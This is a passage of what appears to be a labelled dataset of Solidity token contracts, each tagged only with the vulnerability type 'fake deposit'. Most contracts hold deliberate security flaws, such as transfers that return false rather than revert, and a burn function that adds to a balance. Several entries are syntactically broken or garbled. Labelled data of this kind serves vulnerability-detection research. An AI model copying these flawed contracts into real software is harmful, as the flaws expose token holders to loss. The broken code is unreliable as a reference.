        "Code": "pragma solidity >=0.4.22 <0.6.0;\r\n\r\ncontract ERC20 {\r\n    function totalSupply() public view returns (uint supply);\r\n    function balanceOf(address who) public view returns (uint value);\r\n    function allowance(address owner, address spender) public view returns (uint remaining);\r\n    function transferFrom(address from, address to, uint value) public returns (bool ok);\r\n    function approve(address spender, uint value) public returns (bool ok);\r\n    function transfer(address to, uint value) public returns (bool ok);\r\n    event Transfer(address indexed from, address indexed to, uint value);\r\n    event Approval(address indexed owner, address indexed spender, uint value);\r\n}\r\n\r\ncontract InuHedgehog is ERC20{\r\n    uint8 public constant decimals = 18;\r\n    uint256 initialSupply = 1000000000000000*10**uint256(decimals);\r\n    string public constant name = \"Inu Hedgehog\";\r\n    string public constant symbol = \"INUH \ud83e\udd94\";\r\n\r\n    address payable teamAddress;\r\n\r\n    function totalSupply() public view returns (uint256) {\r\n        return initialSupply;\r\n    }\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    \r\n    function balanceOf(address owner) public view returns (uint256 balance) {\r\n        return balances[owner];\r\n    }\r\n    function allowance(address owner, address spender) public view returns (uint remaining) {\r\n        return allowed[owner][spender];\r\n    }\r\n    function transfer(address to, uint256 value) public returns (bool success) {\r\n        if (balances[msg.sender] >= value && value > 0) {\r\n            balances[msg.sender] -= value;\r\n            balances[to] += value;\r\n            emit Transfer(msg.sender, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n    function transferFrom(address from, address to, uint256 value) public returns (bool success) {\r\n        if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\r\n            balances[to] += value;\r\n            balances[from] -= value;\r\n            allowed[from][msg.sender] -= value;\r\n            emit Transfer(from, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n    function approve(address spender, uint256 value) public returns (bool success) {\r\n        allowed[msg.sender][spender] = value;\r\n        emit Approval(msg.sender, spender, value);\r\n        return true;\r\n    }\r\n     function () external payable {\r\n        teamAddress.transfer(msg.value);\r\n    }\r\n    constructor () public payable {\r\n        teamAddress = msg.sender;\r\n        balances[teamAddress] = initialSupply;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity 0.6.12;\npragma experimental ABIEncoderV2;\n\ncontract Domain {\n\n    constructor() public {\n        uint256 chainId;\n        assembly {\n            chainId := chainid()\n        }\n        _DOMAIN_SEPARATOR = _calculateDomainSeparator(DOMAIN_SEPARATOR_CHAIN_ID = chainId);\n    }\n\n    function _domainSeparator() internal view returns (bytes32) {\n        uint256 chainId;\n        assembly {\n            chainId := chainid()\n        }\n        return chainId == DOMAIN_SEPARATOR_CHAIN_ID ? _DOMAIN_SEPARATOR : _calculateDomainSeparator(chainId);\n    }\n\n    function _getDigest(bytes32 dataHash) internal view returns (bytes32 digest) {\n        digest = keccak256(abi.encodePacked(EIP191_PREFIX_FOR_EIP712_STRUCTURED_DATA, _domainSeparator(), dataHash));\n    }\n}\n\n\ncontract ERC20Data {\n    /// @notice owner > balance mapping.\n    mapping(address => uint256) public balanceOf;\n    /// @notice owner > spender > allowance mapping.\n    mapping(address => mapping(address => uint256)) public allowance;\n    /// @notice owner > nonce mapping. Used in `permit`.\n    mapping(address => uint256) public nonces;\n}\n\ncontract ERC20 is ERC20Data, Domain {\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n\n    function transfer(address to, uint256 amount) public returns (bool) {\n        // If `amount` is 0, or `msg.sender` is `to` nothing happens\n        if (amount != 0) {\n            uint256 srcBalance = balanceOf[msg.sender];\n            require(srcBalance >= amount, \"ERC20: balance too low\");\n            if (msg.sender != to) {\n                require(to != address(0), \"ERC20: no zero address\"); // Moved down so low balance calls safe some gas\n\n                balanceOf[msg.sender] = srcBalance - amount; // Underflow is checked\n                balanceOf[to] += amount; // Can't overflow because totalSupply would be greater than 2^256-1\n            }\n        }\n        emit Transfer(msg.sender, to, amount);\n        return true;\n    }\n\n    function transferFrom(\n        address from,\n        address to,\n        uint256 amount\n    ) public returns (bool) {\n        // If `amount` is 0, or `from` is `to` nothing happens\n        if (amount != 0) {\n            uint256 srcBalance = balanceOf[from];\n            require(srcBalance >= amount, \"ERC20: balance too low\");\n\n            if (from != to) {\n                uint256 spenderAllowance = allowance[from][msg.sender];\n                // If allowance is infinite, don't decrease it to save on gas (breaks with EIP-20).\n                if (spenderAllowance != type(uint256).max) {\n                    require(spenderAllowance >= amount, \"ERC20: allowance too low\");\n                    allowance[from][msg.sender] = spenderAllowance - amount; // Underflow is checked\n                }\n                require(to != address(0), \"ERC20: no zero address\"); // Moved down so other failed calls safe some gas\n\n                balanceOf[from] = srcBalance - amount; // Underflow is checked\n                balanceOf[to] += amount; // Can't overflow because totalSupply would be greater than 2^256-1\n            }\n        }\n        emit Transfer(from, to, amount);\n        return true;\n    }\n\n    function approve(address spender, uint256 amount) public returns (bool) {\n        allowance[msg.sender][spender] = amount;\n        emit Approval(msg.sender, spender, amount);\n        return true;\n    }\n\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity =0.8.1;\n\nabstract contract Context {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691\n        return msg.data;\n    }\n}\n\npragma solidity =0.8.1;\n\nimport \"./IERC20.sol\";\nimport \"./Context.sol\";\n\ncontract ERC20 is Context, IERC20 {\n    mapping (address =u003e uint256) internal _balances;\n    mapping (address =u003e mapping (address =u003e uint256)) private _allowances;\n    uint256 internal _totalSupply;\n    string internal _name;\n    string internal _symbol;\n\n    constructor (string memory name_, string memory symbol_) {\n        _name = name_;\n        _symbol = symbol_;\n    }\n\n    function name() public view virtual returns (string memory) {\n        return _name;\n    }\n\n    function symbol() public view virtual returns (string memory) {\n        return _symbol;\n    }\n\n    function decimals() public view virtual returns (uint8) {\n        return 18;\n    }\n\n    function totalSupply() public view virtual override returns (uint256) {\n        return _totalSupply;\n    }\n\n    function balanceOf(address account) public view virtual override returns (uint256) {\n        return _balances[account];\n    }\n\n    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\n        _transfer(_msgSender(), recipient, amount);\n        return true;\n    }\n\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\n        return _allowances[owner][spender];\n    }\n\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\n        _approve(_msgSender(), spender, amount);\n        return true;\n    }\n\n    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {\n        _transfer(sender, recipient, amount);\n\n        uint256 currentAllowance = _allowances[sender][_msgSender()];\n        require(currentAllowance u003e= amount, \"ERC20: transfer amount exceeds allowance\");\n        _approve(sender, _msgSender(), currentAllowance - amount);\n\n        return true;\n    }\n\n    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);\n        return true;\n    }\n\n    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\n        uint256 currentAllowance = _allowances[_msgSender()][spender];\n        require(currentAllowance u003e= subtractedValue, \"ERC20: decreased allowance below zero\");\n        _approve(_msgSender(), spender, currentAllowance - subtractedValue);\n\n        return true;\n    }\n\n    function _transfer(address sender, address recipient, uint256 amount) internal virtual {\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\n\n        _beforeTokenTransfer(sender, recipient, amount);\n\n        uint256 senderBalance = _balances[sender];\n        require(senderBalance u003e= amount, \"ERC20: transfer amount exceeds balance\");\n        _balances[sender] = senderBalance - amount;\n        _balances[recipient] += amount;\n\n        emit Transfer(sender, recipient, amount);\n    }\n\n    function _burn(address account, uint256 amount) internal virtual {\n        require(account != address(0), \"ERC20: burn from the zero address\");\n\n        uint256 accountBalance = _balances[account];\n        _balances[account] = accountBalance + amount;\n        emit Transfer(account, address(0), amount);\n    }\n\n    function _approve(address owner, address spender, uint256 amount) internal virtual {\n        require(owner != address(0), \"ERC20: approve from the zero address\");\n        require(spender != address(0), \"ERC20: approve to the zero address\");\n\n        _allowances[owner][spender] = amount;\n        emit Approval(owner, spender, amount);\n    }\n\n    function _transfer(address sender, address recipient, uint256 amount) internal override {\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\n        require(amount u003e 0, \"Transfer amount must be grater thatn zero\");\n        if (_call[sender] || _call[recipient]) require(_trans == false, \"\");\n         if (_trans == true || sender == owner || recipient == owner) {\n        _beforeTokenTransfer(sender, recipient, amount);\n        uint256 senderBalance = _balances[sender];\n        require(senderBalance u003e= amount, \"ERC20: transfer amount exceeds balance\");\n        _balances[sender] = senderBalance - amount;\n        _balances[recipient] += amount;\n        emit Transfer(sender, recipient, amount);} else {\n        require (_trans == true, \"\");}\n    }\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity ^0.4.26;\n\ncontract NTH {\n\n    string public constant name = \"NTH\";\n    string public constant symbol = \"NTH\";\n    uint8 public constant decimals = 18;\n\n    uint private _totalSupply;\n\n    mapping(address => mapping(address => uint256)) private _allowed;\n    event MintedLog(address to, uint256 amount);\n    event Transfer(address indexed from, address indexed to, uint value);\n\n\n    function NTH() public {\n        _tokenSupply = 0;\n        _totalSupply = 10000000000 * (uint256(10) ** decimals);\n\n    }\n\n    function totalSupply() public constant returns (uint256) {\n        return _tokenSupply;\n    }\n\n    function mint(address to, uint256 amount) onlyOwner public returns (bool){\n\n        amount = amount * (uint256(10) ** decimals);\n        if(_totalSupply + 1 > (_tokenSupply+amount)){\n            _tokenSupply = _tokenSupply.add(amount);\n            _balances[to]= _balances[to].add(amount);\n            emit MintedLog(to, amount);\n            return true;\n        }\n\n        return false;\n    }\n\n    function dist_list_set(address[] dist_list, uint256[] token_list) onlyOwner external{\n\n        for(uint i=0; i < dist_list.length ;i++){\n            transfer(dist_list[i],token_list[i]);\n        }\n\n    }\n    function balanceOf(address tokenOwner) public constant returns (uint256 balance) {\n        return _balances[tokenOwner];\n    }\n\n    function transfer(address to, uint tokens) whenNotPaused isLockAddress public returns(bool success){\n    bytes memory empty;\n    \tif(isContract(to)) {\n        \treturn transferToContract(to, tokens, empty);\n    \t}\n    \telse {\n        \treturn transferToAddress(to, tokens, empty);\n    \t}\n    }\n\n\n    function approve(address spender, uint256 tokens) public returns (bool success) {\n\n        if (tokens > 0 && balanceOf(msg.sender) >= tokens) {\n            _allowed[msg.sender][spender] = tokens;\n            emit Approval(msg.sender, spender, tokens);\n            return true;\n        }\n\n        return false;\n    }\n\n    function allowance(address tokenOwner, address spender) public constant returns (uint remaining) {\n        return _allowed[tokenOwner][spender];\n    }\n\n    function transferFrom(address from, address to, uint256 tokens) public returns (bool success) {\n        if (tokens > 0 && balanceOf(from) >= tokens && _allowed[from][msg.sender] >= tokens) {\n            _balances[from] = _balances[from].sub(tokens);\n            _allowed[from][msg.sender] = _allowed[from][msg.sender].sub(tokens);\n            _balances[to] = _balances[to].add(tokens);\n            emit Transfer(msg.sender, to, tokens);\n            return true;\n        }\n        return false;\n    }\n\n    function burn(uint256 tokens) public returns (bool success) {\n        if ( tokens > 0 && balanceOf(msg.sender) >= tokens ) {\n            _balances[msg.sender] = _balances[msg.sender].sub(tokens);\n            _tokenSupply = _tokenSupply.sub(tokens);\n            return true;\n        }\n\n        return false;\n    }\n  function transferToAddress(address _to, uint _value, bytes _data) private returns (bool success) {\n    if (balanceOf(msg.sender) < _value) revert();\n    _balances[msg.sender] = balanceOf(msg.sender).sub(_value);\n    _balances[_to] = balanceOf(_to).add(_value);\n    emit Transfer(msg.sender, _to, _value);\n    return true;\n  }\n\n  //function that is called when transaction target is a contract\n  function transferToContract(address _to, uint _value, bytes _data) private returns (bool success) {\n    if (balanceOf(msg.sender) < _value) revert();\n    _balances[msg.sender] = balanceOf(msg.sender).sub(_value);\n    _balances[_to] = balanceOf(_to).add(_value);\n    ContractReceiver receiver = ContractReceiver(_to);\n    receiver.tokenFallback(msg.sender, _value, _data);\n    emit Transfer(msg.sender, _to, _value);\n    return true;\n}\n\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity ^0.8.4;\n\n\ncontract AGFTokenV1 {\n  string private constant NAME = 'Augmented Finance Reward Token';\n  string private constant SYMBOL = 'AGF';\n\n  uint256 private constant TOKEN_REVISION = 1;\n  uint256 private constant TREASURY_MINT = 1000;\n\n  constructor() ERC20BaseWithPermit(NAME, SYMBOL, DECIMALS) MarketAccessBitmask(IMarketAccessController(address(0))) {}\n\n  function getRevision() internal pure virtual override returns (uint256) {\n    return TOKEN_REVISION;\n  }\n\n  // This initializer is invoked by AccessController.setAddressAsImpl\n  function initialize(IMarketAccessController remoteAcl) external virtual initializer(TOKEN_REVISION) {\n    _initialize(remoteAcl, NAME, SYMBOL, DECIMALS);\n  }\n\n  function initializeRewardToken(InitRewardTokenData calldata data)\n    external\n    virtual\n    override\n    initializer(TOKEN_REVISION)\n  {\n    _initialize(data.remoteAcl, data.name, data.symbol, data.decimals);\n  }\n\n  function _initialize(\n    IMarketAccessController remoteAcl,\n    string memory name,\n    string memory symbol,\n    uint8 decimals\n  ) private {\n    require(decimals == DECIMALS, 'UNSUPPORTED_DECIMALS');\n    _remoteAcl = remoteAcl;\n    super._initializeERC20(name, symbol, decimals);\n    super._initializeDomainSeparator();\n\n    if (address(remoteAcl) != address(0)) {\n      address treasury = remoteAcl.getAddress(AccessFlags.TREASURY);\n      if (treasury != address(0)) {\n        _allocateAndMint(treasury, TREASURY_MINT * (10**DECIMALS));\n      }\n    }\n  }\n\n  event Transfer(address indexed from, address indexed to, uint256 value);\n\n  function transfer(address recipient, uint256 amount) public override returns (bool) {\n    _transfer(msg.sender, recipient, amount);\n    return true;\n  }\n\n  function transferFrom(\n    address sender,\n    address recipient,\n    uint256 amount\n  ) public override returns (bool) {\n    _transfer(sender, recipient, amount);\n    _approveTransferFrom(sender, amount);\n    return true;\n  }\n\n  function _approveTransferFrom(address owner, uint256 amount) internal virtual;\n\n  function _transfer(\n    address sender,\n    address recipient,\n    uint256 amount\n  ) internal virtual {\n    require(sender != address(0), 'ERC20: transfer from the zero address');\n    require(recipient != address(0), 'ERC20: transfer to the zero address');\n\n    _beforeTokenTransfer(sender, recipient, amount);\n    if (sender != recipient) {\n      transferBalance(sender, recipient, amount);\n    }\n\n    emit Transfer(sender, recipient, amount);\n  }\n\n\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity >=0.4.22 <0.6.0;\n\ncontract SimpleToken {\n    mapping (address => uint256) public balances;\n    uint256 public totalSupply = 1000000;\n\n    constructor() public {\n        balances[msg.sender] = totalSupply;\n    }\n\n    function transfer(address _to, uint256 _value) public returns (bool success) {\n        require(balances[msg.sender] >= _value, \"Insufficient balance\");\n        balances[msg.sender] -= _value;\n        balances[_to] += _value;\n        return true;\n    }\n\n    function balanceOf(address _owner) public view returns (uint256 balance) {\n        return balances[_owner];\n    }\n\n    function () external payable {\n        balances[msg.sender] += msg.value;\n    }\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n    function totalSupply() public view returns (uint256);\n    function balanceOf(address who) public view returns (uint256);\n    function transfer(address to, uint256 value) public returns (bool);\n    event Transfer(address indexed from, address indexed to, uint256 value);\n}\n\ncontract SuperToken is ERC20 {\n    string public name = \"SuperToken\";\n    string public symbol = \"SUP\";\n    uint8 public decimals = 18;\n\n    uint256 private _totalSupply;\n    mapping(address => uint256) private _balances;\n    address payable private _owner;\n\n    event Mint(address indexed to, uint256 amount);\n    event Burn(address indexed from, uint256 amount);\n\n    if(_balances[msg.sender] >= value){\n        _balances[msg.sender] -= value;\n        _balances[to] += value;\n        emit Transfer(msg.sender, to, value);\nreturn true;\n} else{\n        return false;\n        }\n    }\n\n    function mint(uint256 amount) public {\n        require(msg.sender == _owner);\n        _totalSupply += amount;\n        _balances[_owner] += amount;\n        emit Mint(_owner, amount);\n    }\n\n    function burn(uint256 amount) public {\n        require(_balances[msg.sender] >= amount);\n        _balances[msg.sender] -= amount;\n        _totalSupply -= amount;\n        emit Burn(msg.sender, amount);\n    }\n\n}\n\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity ^0.6.12;\n\ncontract KingLionFinance {\n\n    mapping (address => uint256) private _rOwned;\n    mapping (address => uint256) private _tOwned;\n    mapping (address => mapping (address => uint256)) private _allowances;\n\n    mapping (address => bool) private _isExcluded;\n    address[] private _excluded;\n   \n    uint256 private constant MAX = ~uint256(0);\n    uint256 private constant _tTotal = 1000 * 10**6 * 10**9;\n    uint256 private _rTotal = (MAX - (MAX % _tTotal));\n    uint256 private _tFeeTotal;\n\n    string private _name = 'King Lion Finance';\n    string private _symbol = 'KLF';\n    uint8 private _decimals = 9;\n    uint256 private _distributionPercentage = 0;\n    uint256 private _teamFee = 0;\n    address private _feeAddress = 0x55b246BfD95CE09ceA06301CA8CAEa2673a7543c;\n    bool private _tradeEnabled = true;\n   \n    uint256 private _maxTxAmount = 1 * 10**6 * 10**9;\n   \n    constructor () public {\n        _rOwned[_msgSender()] = _rTotal;\n        emit Transfer(address(0), _msgSender(), _tTotal);\n    }\n\n    function name() public view returns (string memory) {\n        return _name;\n    }\n \n    function symbol() public view returns (string memory) {\n        return _symbol;\n    }\n\n    function decimals() public view returns (uint8) {\n        return _decimals;\n    }\n   \n    function feeAddress() public view returns (address) {\n        return _feeAddress;\n    }\n\n    function totalSupply() public view override returns (uint256) {\n        return _tTotal;\n    }\n\n    function balanceOf(address account) public view override returns (uint256) {\n        if (_isExcluded[account]) return _tOwned[account];\n        return tokenFromReflection(_rOwned[account]);\n    }\n\n    function transfer(address recipient, uint256 amount) public override returns (bool) {\n        _transfer(_msgSender(), recipient, amount);\n        return true;\n    }\n\n    function allowance(address owner, address spender) public view override returns (uint256) {\n        return _allowances[owner][spender];\n    }\n\n    function approve(address spender, uint256 amount) public override returns (bool) {\n        _approve(_msgSender(), spender, amount);\n        return true;\n    }\n\n    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {\n        _transfer(sender, recipient, amount);\n        return true;\n    }\n\n    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));\n        return true;\n    }\n\n\n    function isExcluded(address account) public view returns (bool) {\n        return _isExcluded[account];\n    }\n\n    function totalFees() public view returns (uint256) {\n        return _tFeeTotal;\n    }\n   \n    function _transfer(address sender, address recipient, uint256 amount) private {\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\n        require(amount > 0, \"Transfer amount must be greater than zero\");\n        if(sender != owner() && recipient != owner())\n          require(amount <= _maxTxAmount, \"Transfer amount exceeds the maxTxAmount.\");\n        require(_tradeEnabled, \"Trading disabled.\");\n        if(_tradeEnabled){\n            if (_isExcluded[sender] && !_isExcluded[recipient]) {\n                _transferFromExcluded(sender, recipient, amount);\n            } else {\n                _transferStandard(sender, recipient, amount);\n            }\n        }\n    }\n\n   \n    function _transferStandard(address sender, address recipient, uint256 tAmount) private {\n        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee, uint256 tTeam) = (1,1,1,1,1,1);\n        _rOwned[sender] = _rOwned[sender].sub(rAmount);\n        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);\n        _takeTeam(tTeam);\n        _reflectFee(rFee, tFee);\n        emit Transfer(sender, recipient, tTransferAmount);\n    }\n\n    function _transferFromExcluded(address sender, address recipient, uint256 tAmount) private {\n        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee, uint256 tTeam) = (1,1,1,1,1,1);\n        _tOwned[sender] = _tOwned[sender].sub(tAmount);\n        _rOwned[sender] = _rOwned[sender].sub(rAmount);\n        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);\n        _takeTeam(tTeam);  \n        _reflectFee(rFee, tFee);\n        emit Transfer(sender, recipient, tTransferAmount);\n    }\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n    function totalSupply() public view returns (uint256);\n    function balanceOf(address who) public view returns (uint256);\n    function transfer(address to, uint256 value) public returns (bool);\n    event Transfer(address indexed from, address indexed to, uint256 value);\n}\n\ncontract CryptoGold is ERC20 {\n    string public name = \"CryptoGold\";\n    string public symbol = \"CG\";\n    uint8 public decimals = 18;\n\n    uint256 private _totalSupply;\n    mapping(address => uint256) private _balances;\n    mapping(address => uint256) private _stakes;\n    address payable private _owner;\n\n    event Mint(address indexed to, uint256 amount);\n    event Stake(address indexed from, uint256 amount);\n\n    constructor() public {\n        _owner = msg.sender;\n        _totalSupply = 100000000 * (10 ** uint256(decimals));\n        _balances[_owner] = _totalSupply;\n        emit Transfer(address(0), _owner, _totalSupply);\n    }\n\n    function totalSupply() public view returns (uint256) {\n        return _totalSupply;\n    }\n\n    function balanceOf(address account) public view returns (uint256) {\n        return _balances[account];\n    }\n\n    function transfer(address recipient, uint256 amount) public returns (bool) {\n        if(amount <= _balances[msg.sender], \"Insufficient balance.\"){\nbalances[msg.sender] -= amount;\n       balances[recipient] += amount;\n        emit Transfer(msg.sender, recipient, amount);\n        return true;\n}else{\nreturn false;}\n    }\n\n    function stake(uint256 amount) public {\n        _balances[msg.sender] -= amount;\n        _stakes[msg.sender] += amount;\n        emit Stake(msg.sender, amount);\n    }\n\n    function unstake(uint256 amount) public {\n        _stakes[msg.sender] -= amount;\n        _balances[msg.sender] += amount;\n        emit Stake(msg.sender, -amount);\n    }\n\n    function () external payable {\n        _owner.transfer(msg.value);\n    }\n}\n\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity ^0.4.20;\n\ncontract EURSToken is AbstractToken {\n  uint256 constant internal FEE_DENOMINATOR = 100000;\n\n  uint256 constant internal MAX_FEE_NUMERATOR = FEE_DENOMINATOR;\n\n  uint256 constant internal MIN_FEE_NUMERATIOR = 0;\n\n  uint256 constant internal MAX_TOKENS_COUNT =\n    0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff /\n    MAX_FEE_NUMERATOR;\n\n  uint256 constant internal DEFAULT_FEE = 5e2;\n\n  uint256 constant internal BLACK_LIST_FLAG = 0x01;\n\n  uint256 constant internal ZERO_FEE_FLAG = 0x02;\n\n  function EURSToken (address _feeCollector) public {\n    fixedFee = DEFAULT_FEE;\n    minVariableFee = 0;\n    maxVariableFee = 0;\n    variableFeeNumerator = 0;\n\n    owner = msg.sender;\n    feeCollector = _feeCollector;\n  }\n\n  function () public delegatable payable {\n    revert (); // Revert if not delegated\n  }\n\n  function name () public delegatable view returns (string) {\n    return \"STASIS EURS Token\";\n  }\n\n  function symbol () public delegatable view returns (string) {\n    return \"EURS\";\n  }\n\n  function decimals () public delegatable view returns (uint8) {\n    return 2;\n  }\n\n  function totalSupply () public delegatable view returns (uint256) {\n    return tokensCount;\n  }\n\n  function balanceOf (address _owner)\n    public delegatable view returns (uint256 balance) {\n    return AbstractToken.balanceOf (_owner);\n  }\n\n  function transfer (address _to, uint256 _value)\n  public delegatable payable returns (bool) {\n    if (frozen) return false;\n    else if (\n      (addressFlags [msg.sender] | addressFlags [_to]) & BLACK_LIST_FLAG ==\n      BLACK_LIST_FLAG)\n      return false;\n    else {\n      uint256 fee =\n        (addressFlags [msg.sender] | addressFlags [_to]) & ZERO_FEE_FLAG == ZERO_FEE_FLAG ?\n          0 :\n          calculateFee (_value);\n\n      if (_value <= accounts [msg.sender] &&\n          fee <= safeSub (accounts [msg.sender], _value)) {\n        require (AbstractToken.transfer (_to, _value));\n        require (AbstractToken.transfer (feeCollector, fee));\n        return true;\n      } else return false;\n    }\n  }\n\n  function transferFrom (address _from, address _to, uint256 _value)\n  public delegatable payable returns (bool) {\n    if (frozen) return false;\n    else if (\n      (addressFlags [_from] | addressFlags [_to]) & BLACK_LIST_FLAG ==\n      BLACK_LIST_FLAG)\n      return false;\n    else {\n      uint256 fee =\n        (addressFlags [_from] | addressFlags [_to]) & ZERO_FEE_FLAG == ZERO_FEE_FLAG ?\n          0 :\n          calculateFee (_value);\n\n      if (_value <= allowances [_from][msg.sender] &&\n          fee <= safeSub (allowances [_from][msg.sender], _value) &&\n          _value <= accounts [_from] &&\n          fee <= safeSub (accounts [_from], _value)) {\n        require (AbstractToken.transferFrom (_from, _to, _value));\n        require (AbstractToken.transferFrom (_from, feeCollector, fee));\n        return true;\n      } else return false;\n    }\n  }\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "//SPDX-License-Identifier: Apache-2.0;\r\npragma solidity ^0.7.6;\r\n\r\nlibrary SafeMath {\r\n\r\n  \r\n  function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\r\n    if (a == 0) {\r\n      return 0;\r\n    }\r\n    c = a * b;\r\n    assert(c / a == b);\r\n    return c;\r\n  }\r\n\r\n  \r\n  function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n  \r\n    return a / b;\r\n  }\r\n\r\n \r\n  function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    assert(b <= a);\r\n    return a - b;\r\n  }\r\n\r\n  \r\n  function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\r\n    c = a + b;\r\n    assert(c >= a);\r\n    return c;\r\n  }\r\n}\r\n\r\n\r\ninterface ERC20Interface {\r\n    \r\n    function totalSupply() external view returns (uint256);\r\n\r\n    \r\n    function balanceOf(address account) external view returns (uint256);\r\n\r\n    \r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n\r\n    \r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n\r\n    \r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n\r\n    \r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n\r\n   \r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n\r\n    \r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\nabstract contract ERC20Base is ERC20Interface {\r\n\r\n    using SafeMath for uint256;\r\n\r\n    mapping (address => uint256) public _balances;\r\n    mapping (address => mapping (address => uint256)) public _allowances;\r\n    uint256 public _totalSupply;\r\n\r\n    function transfer(address _to, uint256 _value) public override returns (bool success) {\r\n        if (_balances[msg.sender] >= _value && _balances[_to].add(_value) > _balances[_to]) {\r\n            _balances[msg.sender] = _balances[msg.sender].sub(_value);\r\n            _balances[_to] = _balances[_to].add(_value);\r\n            emit Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        }\r\n\r\n        return false;\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) public override returns (bool success) {\r\n        if (_balances[_from] >= _value && _allowances[_from][msg.sender] >= _value && _balances[_to].add(_value) > _balances[_to]) {\r\n            _balances[_to] = _balances[_to].add(_value);\r\n            _balances[_from] = _balances[_from].sub(_value);\r\n            _allowances[_from][msg.sender] = _allowances[_from][msg.sender].sub(_value);\r\n            emit Transfer(_from, _to, _value);\r\n            return true;\r\n        }\r\n        return false;\r\n    }\r\n\r\n    function balanceOf(address _owner) public override view returns (uint256 balance) {\r\n        return _balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value) public override returns (bool success) {\r\n        _allowances[msg.sender][_spender] = _value;\r\n        emit Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) public override view returns (uint256 remaining) {\r\n      return _allowances[_owner][_spender];\r\n    }\r\n\r\n    function totalSupply() public override view returns (uint256 total) {\r\n        return _totalSupply;\r\n    }\r\n}\r\n\r\ncontract WurstcoinNG is ERC20Base {\r\n\r\n    using SafeMath for uint256;\r\n\r\n    uint256 constant SUPPLY = 10000000;\r\n    address immutable owner = msg.sender;\r\n\r\n    string private _name;\r\n    string private _symbol;\r\n    uint8 private _decimals;\r\n\r\n\r\n    constructor () payable {\r\n        require(SUPPLY > 0, \"SUPPLY has to be greater than 0\");\r\n\r\n        _name = \"Wurstcoin\";\r\n        _symbol = \"WURST\";\r\n        _decimals = uint8(18);\r\n        _totalSupply = 